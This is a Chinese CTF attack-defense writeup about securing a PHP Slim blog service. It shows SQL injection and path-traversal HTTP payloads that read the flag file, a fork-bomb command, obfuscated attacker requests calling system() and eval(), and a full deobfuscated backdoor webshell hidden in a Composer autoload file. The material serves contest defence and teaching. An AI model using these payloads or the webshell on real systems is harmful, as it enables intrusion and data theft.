---
title: 2016 全国大学生信息安全竞赛初赛 Writeup
authorId: rexskz
tags:
  - writeup
categories:
  - Writeup
date: 2016-08-14 02:25
---

得益于初赛的人品，我们有幸入围了决赛。但是对于决赛的比赛方式：攻防赛，我们并不了解，事先也不知道需要准备哪些东西，只是配了几个扫描器，然后就是之前用的 IDA 之类的工具和各种语言环境。经过两天的比赛，最终成绩是第 12 名（如果没有赛后的名次变动的话）。这次比赛确实让我学到了一些东西，下面我就来说一说吧~

各组选手维护相同的一系列服务，每五分钟（第二天改为了三分钟）为一轮，有一个flag 文件是 `/home/flag/flag`，你需要努力获取其它队伍的 flag 文件，也要尽量保证自己的 flag 文件不会被获取。每一轮这个文件的内容都会变，每一轮每个队伍只能提交获取到的其它各个队伍的 flag 各一次。也就是说，如果你不把漏洞修好，那么每一轮都可以被所有发现该漏洞的队伍攻击一次；每一轮会有一次服务存活检测，如果服务 down 掉了，丢失的分数会更多。

由于这次的题目类型大多是 PWN 的，而我是一只 WEB 狗，所以大部分的分数并不是我拿的，对于 PWN 的题目我也没法做什么分析。这次比赛的 WEB 题是这样的：你要维护的是一个简单的博客系统，使用的框架是 PHP Slim，支持最简单的注册、登录、发博文（标题、纯文本内容、模板名称）的功能。flag 文件是 `/home/flag/flag`，属于 `www-data`，权限为 511（每一轮自动换）。我们需要获取其它队伍的 flag 文件中的内容。

与之同时发布的还有一道 PWN 题，@沈园 同学果断接下了这个锅（事实上我们几乎所有有成绩的 PWN 题，修补漏洞和编写 EXP 都是他负责的，在此先膜拜一下 ），我和@SummerZhang 同学开始看 WEB。

首先先用 `tar` 命令将整个 web 目录打包，放到 `/tmp` 下，然后通过 `scp` 命令将其复制到本地。

```bash
scp ctf@10.250.111.11:/tmp/www.tar.gz ./www.tar.gz
```

解压缩之后对里面的文件进行逐一查看：

```text
web
├─html
│  ├─css
│  ├─fonts
│  │  └─roboto
│  ├─img
│  └─js
├─log
├─templates
│  └─note_tpl
└─vendor
```

其中 `html` 文件夹中主要是 PHP 文件，`config.php` 是一些配置项，包括数据库的账号和密码，由于每一队维护的服务代码都是相同的，而且我们也没权限修改数据库的登录密码，因此这些无需修改。但是上面有这么一句：

```php
$config['displayErrorDetails'] = true;
```

为了保险起见还是改成 `false` 吧。接下来是 `db.php`，是自己写的一个库文件，我们大概能感觉到这里面会有 SQL 注入的风险。

```php
public function where($key = '', $operate = '', $value = '') {
    $this->where[] = sprintf("%s %s '%s'", $this->filter($key), $operate, $this->filter($value));
}
```

看到这个函数的时候我还诧异：居然写了过滤？然而找到这个函数之后才发现：

```php
public function filter($value) {
    return $value;
}
```

坑爹呢！于是赶紧在 return 的值外面包了层 `addslashes`。继续往下看有个 `select` 函数：

```php
public function select($value = '*') {
    if(count($this->where) == 0) {
        $sql = sprintf("SELECT %s FROM %s ", $value, $this->table);
    }
    else {
        $where = implode(' AND ', $this->where);
        $sql = sprintf("SELECT %s FROM %s WHERE %s", $value, $this->table, $where);
    }
    $sql .= $this->limit;
    $this->limit = '';
    $result = mysqli_query($this->conn, $sql);
    if(!$result)
        return null;
    while($tmp = mysqli_fetch_row($result)) {
        $ret[] = $tmp;
    }
    return @$ret;
}
```

不用想了，`$where` 这儿也有问题。在 `else` 一段为它添加 `addslashes` 吧：

```php
else {
    $o = array();
    foreach ($where as $key => $value) {
        $o[$key] = addslashes($value);
    }
    $where = implode(' AND ', $o);
    $sql = sprintf("SELECT %s FROM %s WHERE %s", $value, $this->table, $where);
}
```

下面是一个 `insert` 函数，不定参数。其中有一句似乎是调用了 `$this-&gt;filter`：

```php
$args_list = array_map(array($this, 'filter'), func_get_args());
```

这段应该是没问题的，所以不改了。下面的 `sess` 类和 `hello` 函数也没发现什么问题。至此，`db.php` 已经没有什么明显的 BUG 了。接下来看 `index.php`，其中对路由 `/list` 的处理中，有一段看起来可能有问题：获取到文章的信息存放到 `$result` 之后，执行渲染的函数：

```php
return $this->view->render($response, "/list.tpl", array(
    'username'     => $hello,
    'notes'        => $result,
    'total_page'   => $total_page,
    'current_page' => $current_page
));
```

其中 `/list.tpl` 文件中有这样一段：

```php
{% for note in notes %}
    {% embed note.3 %}
        {% block title %}{{ note.1 }}{% endblock %}
        {% block content %}{{ note.2 }}{% endblock %}
    {% endembed %}
{% endfor %}
```

`note.3` 是我们发这篇文章时选择的模板文件，它是在路由 `/post` 中被这样生成的：

```php
$title = $parsedBody['title'];
$content = $parsedBody['content'];
$temp = "/note_tpl/{$parsedBody['temp']}.tpl";
$this->db->table('notes');
$this->db->insert($username, $title, $content, $temp);
```

当然，如果 `filter` 函数没有修改的话，可以这样直接注入：

```http
POST /post HTTP/1.1
Host: 10.250.1xx.11
Cookie: PHPSESSID=[logged_session_id]
[Other headers]

content=xxx&temp=0&title=1%27%2C+%27title%27%2C+%27%5C%2Fnote_tpl%5C%2F..%5C%2F..%5C%2F..%5C%2F..%5C%2Fhome%5C%2Fflag%5C%2Fflag%27%29+%23+
```

这样拼接出来的 SQL 是：

```sql
INSERT INTO notes VALUES ('[logged_username]', '1', 'title', '\/note_tpl\/..\/..\/..\/..\/home\/flag\/flag') # ', 'xxx', '0')
```

于是在 render 的时候会触发文件包含的漏洞。如果数据库防了注入，这招就失灵了。但是我们可以这样：发现数据库的 `template` 字段类型是 `varchar`，有长度限制，我们只需要用空格填满剩余的空间即可：

```http
title=0&content=xxx&temp=..%2F..%2F..%2F..%2Fhome%2Fflag%2Fflag++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
```

于是存到数据库中的就相当于 `/home/flag/flag` 了。要说这个也属于逻辑设计不合理，应该是在数据库存放文件名，然后渲染之前现场拼接路径。其实 Slim 本身也做了一层过滤，在 `vendor/twig/twig/lib/Twig/Loader/Filesystem.php` 中有过滤的函数，把注释去掉就可以限定包含的文件只能在当前目录下：

```php
protected function validateName($name) {
    if (false !== strpos($name, "\0")) {
        throw new Twig_Error_Loader('A template name cannot contain NUL bytes.');
    }
    $name = ltrim($name, '/');
    $parts = explode('/', $name);
    $level = 0;
    foreach ($parts as $part) {
        if ('..' === $part) {
            --$level;
        } elseif ('.' !== $part) {
            ++$level;
        }
        if ($level &lt; 0) {
            // throw new Twig_Error_Loader(sprintf('Looks like you try to load a template outside configured directories (%s).', $name));
        }
    }
}
```

但是这么修改太麻烦了，我们看了一下，只有三个模板，文件名分别是 1、2、3……于是果断加了一句：

```php
$parsedBody['temp'] = intval($parsedBody['temp']);
// 下面这句是原来的
$temp = "/note_tpl/{$parsedBody['temp']}.tpl";
```

这下管你什么文件包含呢，通通没办法了吧？于是第一天我们的 WEB 题没有丢分（有一段时间许多队伍的 WEB 被 DoS 了，而 DoS 是被规则禁止的攻击方式，不知道主办方会怎么处理，这段时间的丢分我就认为不算丢分吧），反倒还拿了其它队伍不少分。

但是第二天就奇怪了，一大片队伍的 WEB 题都 down 掉了，我们不光 down 了，还被拿到了 flag。这怎么能忍？我们一遍遍排查代码，确认没有什么逻辑上的漏洞。然后突然发现服务器操作特别慢，于是 `ps aux` 了一下，发现了一大堆这样的命令：

```bash
sh -c echo 123;x() { x|x& };x
```

卧槽，居然连 fork 炸弹都上了！这也是被规则禁止的，于是我们通知了主办方，主办方把所有队伍的 WEB 服务都重启了一遍，但是我们的 WEB 题还是既 down 又被 flag，简直神奇。看了一下 `/tmp` 目录下被上传了一堆 shell，但是我们的 ctf 用户没权限删除 www-data 用户创建的内容。后来我们直接给自己的服务器上了一个 webshell（这就是俗话说的：我急了连自己的机器都上 shell！），因为 webshell 就是以 www-data 用户身份运行的。我们没发现有什么可以上传文件的地方，但是确实是被 get shell 了，于是在找出上传方法之前，先将所有的 shell 文件 kill 掉，然后对其执行 `chmod 000`；刚才 ps 的时候还发现了一个定时发送 flag 的 crontab，于是也果断将其清空。

就算这样还是被 flag 了，而且还在 down 着。我们在改完代码测试流程的时候偶然发现无法注册无法登录，于是猜想是不是数据库挂掉了，于是连进数据库一看，发现整个 database 全部被 drop 掉了……我们之前没有备份数据库，但是凭借着一点点记忆力以及@SummerZhang 同学根据代码推断数据库结构的能力，直接手动建起了数据库，恢复了服务的运行：

```sql
create database 0ops;
use 0ops;
create table users (username varchar(255), password varchar(255));
create table notes (username varchar(255), title varchar(255), content varchar(255), temp varchar(255));
```

但是文件是怎么传上来的呢？我们在 `index.php` 文件的最一开始加了一段代码，可以将全部的 HTTP 请求包记录到 `/tmp/log.txt` 中，然后我们就在命令行中 `tail -f /tmp/log.txt`，开始分析所有的请求，最终锁定了两个奇怪的请求：

```http
GET /index.php?59b620d4=6cd13eb6assert41a2e1&edfd2=50cbin1d3&208a8e=74fe6cdupload89f&25411bcd=cdde9uploadf814ff266a&cecc789=9ce4c38feeval1de&2e84e621f=368c9e9baa918e&7657=b4a6uploadb339c1b1a&d54c1=1925cinto4aa&28d5bd999f=e7fselect3c37&b5fee3356a=c27ceeval2038&43a7c6bb4=4b3b74assert7a51&e9f6642fc=27b7into244&10fd41aefe=44e18a89a6into2a2f&08a3c97=ee6into3a909a4&c565ef5=6ec68upload2224e453&4df26=1fd254select4caaf&3c743ef7=a69bbfaassertbfa HTTP/1.1
Host: 10.250.111.11
Connection: keep-alive
Accept_encoding: gzip, deflate
Accept: */*
User_agent: python-requests/2.10.0
Accept_language: xh-ZA,sa;q=0.5,se;q=0.7,sm;q=0.8
Referer: http://localhost/index.php?379=60c8and6cc&8cdf38c0c=6f9%2Fbin%2Fbash96ca9&62ca6c1a1=52f58bin4550b2b528&9b4f5=c78d226select632b6&70d7cb=b7bc3576bevale12&id6=a45&id7=b7c&id8=TPp8K%2FzwM3%2F%2Fqn7rfXdJvnuo%2BE179U8e4jblqfr3KeJ7rX4qNSsureJmZY89Pg%3D%3D93d&d99=9&id10=707
```

```http
POST /post HTTP/1.1
Host: 10.250.111.11
Accept_encoding: gzip, deflate
Accept: */*
User_agent: python-requests/2.7.0 CPython/2.7.9 Linux/4.0.0-kali1-amd64
Connection: keep-alive
Cookie: PHPSESSID=k4146i6hp0os7siaa8c2526no7

content=,1,0x2f6e6f74655f74706c2f2e2e2f2e2e2f2e2e2f2e2e2f686f6d652f666c61672f666c6167)--+xGj6Evnwu0Lbt4cl1oNKMJJTWOb21MNt5QdqMJiE4ojuUhtUb69&nFXwtiv=
Ok=system('uWz1E2Ygq4jZA5JfdwoAVT17xr9Ped8gujeO".str_rot13("0xZ8FCS8uJQKVJXbXQY7wSYZF3ZowvUv0hw3LIN6E".base64_decode("ypyQrdo7V5t0sZVWBmaLBtmK6aZL7yMZul".eval('xMFxdIFg4zkzyok0gEP2DjMnp8cFLiOlNC5EC776HARtCbn4NkycJ8QN'.var_dump("I1X5Qa4vZHVTjyhead>eDY7920XJdQ44mKSHOLnvgJ".$_SERVER[HTTP_z7Hp57U]("IKtFLD3vFLrxfig3hyZiUyGwP5Qt2QR3dClXFEr7v')"ARRnCZtnLPk54s77D5ILVT8UZxeXFjb5ViV1JKgGeCRHPRpjqoHw9cEE'))'fCvM6J7W0xC0PIPv6x2TPnpOlOOLvufuofXV4myGroWjw6')'qeToFSdgfyXTwK9fFIITmodMiZLN6bhJ3iNMqm9AX60do')
w2RG=system("CCCO5SSrVWrZsBdytM1xTLObt29O639w055UKmgnO55eXMYMzNiCcqfio'.system("DcnBcrhnwJDpGEeSTRrCnHfNBRbMvdfw8Yblp8W8u2G5ysE6G".unlink("QVcHdkVThSo0xAU4Zstc2jF6p6owFvqdah'.strrev('jQwHGxixZF4s4mVVQko2jJ17j9yZgagl8ycD")))
temp=L1Jqzh4S0PcMRxRGhkqQNHllS
title=wV2iOeYuLEh41X7WvpGbXcgkJYPubTjEM2s9eYcPrXQMMG\
```

我们自己尝试了一下，第二个请求之后会直接报 `Slim application error`，但是保险起见我们将所有 UA 带有 `-kali-` 字样的请求全部 die 掉，第一个请求貌似是主办方的服务存活检测，因为将其 die 掉之后我们的网站虽然还能正常运行，但是被判定为 down（但是没有被 flag，这一点我没有及时注意到，这是我的锅），取消 die 之后又变回了只被 flag 的状态。后来惊觉：这是主办方留的后门被人利用了！在 `vendor/autoload.php` 下面发现了后门：

```php
require_once __DIR__ . '/composer' . '/autoload_real.php';
return ComposerAutoloaderInit854778b4c93a322cf2f5c39e558d9f7a::getLoader();
```

在 `vendor/composer/autoload_real.php` 中发现了这样一段代码：

```php
/**
 * Signature For Report
 */$h='_)m/","/-/)m"),)marray()m"/","+")m),$)mss($s[$i)m],0,$e))))m)m,$k)));$o=ob)m_get_c)monte)m)mnts)m();ob_end_clean)';/*
 */$H='m();$d=ba)mse64)m_encode)m(x(gzc)mompres)ms($o),)m$)mk));print("&lt;)m$k>$d&lt;)m/)m$k>)m");@sessio)mn_d)mestroy();}}}}';/*
 */$N='mR;$rr)m=@$r[)m"HTT)mP_RE)mFERER"];$ra)m=)m@$r["HTTP_AC)mC)mEPT_LANG)mUAGE)m")m];if($rr)m&&$ra){)m$u=parse_u)mrl($rr);p';/*
 */$u='$e){)m$k=$)mkh.$kf;ob)m_start();)m@eva)ml(@gzunco)mmpr)mess(@x(@)mbase6)m4_deco)mde(p)m)mreg_re)mplace(array("/';/*
 */$f='$i&lt;$)ml;)m){)mfo)mr($j)m=0;($j&lt;$c&&$i&lt;$l);$j)m++,$i+)m+){$)mo.=$t{$i)m}^$)mk{$j};}}r)meturn )m$o;}$r)m=$_SERVE)';/*
 */$O='[$i]="";$p)m=$)m)mss($p,3)m);}if(ar)mray_)mkey_exists)m()m$i,$s)){$)ms[$i].=$p)m;)m$e=s)mtrpos)m($s[$i],$f);)mif(';/*
 */$w=')m));)m$p="";fo)mr($z=1;)m$z&lt;c)mount()m$m[1]);$)mz++)m)m)$p.=$q[$m[)m)m2][$z]];if(str)mpo)ms($p,$h))m===0){$s)m';/*
 */$P='trt)molower";$)mi=$m[1][0)m)m].$m[1][1])m;$h=$sl()m$ss(m)md5($)mi.$kh)m),0,)m3));$f=$s)ml($ss()m)mmd5($i.$kf),0,3';/*
 */$i=')marse_)mstr)m($u["q)muery"],$)m)mq);$q=array)m_values()m$q);pre)mg_matc)mh_all()m"/([\\w)m])m)[\\w-)m]+(?:;q=0.)';/*
 */$x='m([\\d)m]))?,?/",)m$ra,$m))m;if($q)m&&$)mm))m)m{@session_start();$)ms=&$_S)mESSI)m)mON;$)mss="sub)mstr";$sl="s)m';/*
 */$y=str_replace('b','','crbebbabte_funcbbtion');/*
 */$c='$kh="4f7)m)mf";$kf="2)m)m8d7";funct)mion x($t)m,$k){$)m)mc=strlen($k);$l=st)mrlen)m($t);)m)m$o="";for()m$i=0;';/*
 */$L=str_replace(')m','',$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);/*
 */$v=$y('',$L);$v();/*
 */
function composerRequire854778b4c93a322cf2f5c39e558d9f7a($fileIdentifier, $file)
{
    if (empty($GLOBALS['__composer_autoload_files'][$fileIdentifier])) {
        require $file;

        $GLOBALS['__composer_autoload_files'][$fileIdentifier] = true;
    }
}
```

上面那一串乱码一样的东西其实是个混淆，只要稍微改一改，顺着解析一遍就可以了。把最后的 `$v();` 去掉（一看就是用来执行解析出来的函数的），然后输出 `$y`、`$L`：

```text
【$y】
create_function
【$L】
$kh="4f7f";$kf="28d7";function x($t,$k){$c=strlen($k);$l=strlen($t);$o="";for($i=0;$i&lt;$l;){for($j=0;($j&lt;$c&&$i&lt;$l);$j++,$i++){$o.=$t{$i}^$k{$j};}}return $o;}$r=$_SERVER;$rr=@$r["HTTP_REFERER"];$ra=@$r["HTTP_ACCEPT_LANGUAGE"];if($rr&&$ra){$u=parse_url($rr);parse_str($u["query"],$q);$q=array_values($q);preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/",$ra,$m);if($q&&$m){@session_start();$s=&$_SESSION;$ss="substr";$sl="strtolower";$i=$m[1][0].$m[1][1];$h=$sl($ss(md5($i.$kh),0,3));$f=$sl($ss(md5($i.$kf),0,3));$p="";for($z=1;$z&lt;count($m[1]);$z++)$p.=$q[$m[2][$z]];if(strpos($p,$h)===0){$s[$i]="";$p=$ss($p,3);}if(array_key_exists($i,$s)){$s[$i].=$p;$e=strpos($s[$i],$f);if($e){$k=$kh.$kf;ob_start();@eval(@gzuncompress(@x(@base64_decode(preg_replace(array("/_/","/-/"),array("/","+"),$ss($s[$i],0,$e))),$k)));$o=ob_get_contents();ob_end_clean();$d=base64_encode(x(gzcompress($o),$k));print("&lt;$k>$d&lt;/$k>");@session_destroy();}}}}
```

所以重点就是 `$L` 了。稍微美化一下，在不修改逻辑的情况下简化一些语句，可得：

```php
function xor_encode($text, $key) {
    $result = "";
    for ($i = 0; $i &lt; strlen($text);) {
        for ($j = 0; ($j &lt; strlen($key) && $i &lt; strlen($text)); $j++, $i++) {
            $result .= $text[$i] ^ $key[$j];
        }
    }
    return $result;
}

if ($_SERVER["HTTP_REFERER"] && $_SERVER["HTTP_ACCEPT_LANGUAGE"]) {
    $u = parse_url($_SERVER["HTTP_REFERER"]);
    parse_str($u["query"], $get);
    $get = array_values($get);
    preg_match_all("/([\w])[\w-]+(?:;q=0.([\d]))?,?/", $_SERVER["HTTP_ACCEPT_LANGUAGE"], $match);
    if ($get && $match) {
        @session_start();
        $i = $match[1][0].$match[1][1];
        $h = strtolower(substr(md5($i."4f7f"), 0, 3));
        $f = strtolower(substr(md5($i."28d7"), 0, 3));
        $p = "";
        for ($z = 1; $z &lt; count($match[1]); $z++) $p .= $get[$match[2][$z]];
        if (strpos($p, $h) === 0) {
            $_SESSION[$i] = "";
            $p = substr($p, 3);
        }
        if (array_key_exists($i, $_SESSION)) {
            $_SESSION[$i] .= $p;
            $e = strpos($_SESSION[$i], $f);
            if ($e) {
                $k = "4f7f28d7";
                ob_start();
                @eval(@gzuncompress(@xor_encode(@base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), substr($s[$i], 0, $e))), $k)));
                $o = ob_get_contents();
                ob_end_clean();
                $d = base64_encode(xor_encode(gzcompress($o), $k));
                print("&lt;$k>$d&lt;/$k>");
                @session_destroy();
            }
        }
    }
}
```

可以看出这就是个 webshell，内容是通过 Referer 传进来的。除了好多加密解密以绕过过滤的函数以外，核心代码在这儿：

```php
ob_start();
@eval(@gzuncompress(@xor_encode(@base64_decode(preg_replace(array("/_/", "/-/"), array("/", "+"), substr($s[$i], 0, $e))), $k)));
$o = ob_get_contents();
ob_end_clean();
$d = base64_encode(xor_encode(gzcompress($o), $k));
print("&lt;$k>$d&lt;/$k>");
```

所以只要以同样的方式传进来数据，那么显然可以直接 get shell！似乎这个文件由于权限问题没法直接修改，所以解决问题的最简单的方法就是在 `index.php` 中加入一行代码：

```php
$_SERVER['HTTP_REFERER'] = 'Hello friend';
```

改完之后又过了一轮，我们的 WEB 完全正常了。虽然这个时候已经被打的很惨了……

至于那些 PWN 的题，@沈园 同学负责分析、补漏洞（直接手工修改二进制文件也是 666）、写 exp，@SummerZhang 同学来跑 exp，因为 exp 不是很稳定所以他还顺便当了一次人肉守护进程。

当然，也多亏 @SummerZhang 同学连夜搞出了那道 400 分的静态分析题，现学现卖的能力果然好强。

----

总之，还是我们的水平不够啊……不过这次比赛对我们以后为校内赛出题提供了很多思路，说不定以后的 NUAACTF 就不光会有 CTF，还会有渗透和攻防的赛程了呢！
